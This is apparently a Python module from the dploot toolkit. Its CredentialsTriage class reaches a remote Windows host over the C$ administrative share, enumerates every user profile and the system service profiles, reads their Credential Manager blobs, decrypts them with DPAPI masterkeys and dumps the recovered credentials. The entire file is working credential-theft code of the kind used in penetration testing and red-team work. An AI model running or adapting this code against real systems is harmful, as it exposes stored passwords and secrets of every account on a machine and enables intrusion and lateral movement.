import logging
import ntpath
from typing import List

from dploot.lib.dpapi import decrypt_credential, find_masterkey_for_credential_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_credfile

class CredentialsTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_credentials_generic_path = [
        'Users\\%s\\AppData\\Local\\Microsoft\\Credentials',
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Credentials',
    ]

    system_credentials_generic_path = [
        "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"
    ]
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_system_credentials(self) -> None:
        logging.info('Triage SYSTEM Credentials')
        credential_dirs = self.conn.listDirs(self.share, self.system_credentials_generic_path)
        for system_credential_path,system_credential_dir in credential_dirs.items():
            if system_credential_dir is not None:
                self.triage_credentials_folder(credential_folder_path=system_credential_path,credential_folder=system_credential_dir)
        print()

    def triage_credentials(self) -> None:
        logging.info('Triage Credentials for ALL USERS')
        for user in self.users:
            try:
                self.triage_credentials_for_user(user)
            except Exception as e:
                print(str(e))
                pass
        print()

    def triage_credentials_for_user(self,user: str) -> None:
        credential_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_credentials_generic_path])
        for user_credential_path,user_credential_dir in credential_dirs.items():
            if user_credential_dir is not None:
                self.triage_credentials_folder(credential_folder_path=user_credential_path,credential_folder=user_credential_dir)

    def triage_credentials_folder(self, credential_folder_path,credential_folder) -> None:
        for d in credential_folder:
            if is_credfile(d.get_longname()):
                cred_filename = d.get_longname()
                cred_filename_path = ntpath.join(credential_folder_path,cred_filename)
                logging.info("Found Credential Manager blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,cred_filename_path))
                # read credman blob 
                credmanblob_bytes = self.conn.readFile(self.share,cred_filename_path)
                if credmanblob_bytes is not None and self.masterkeys is not None:
                    self.looted_files[cred_filename] = credmanblob_bytes
                    masterkey = find_masterkey_for_credential_blob(credmanblob_bytes, self.masterkeys)
                    if masterkey is not None:
                        cred = decrypt_credential(credmanblob_bytes,masterkey)
                        if cred['Unknown3'].decode('utf-16le') != '':
                            cred.dump()
                    else:
                        logging.info("Could not decrypt...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users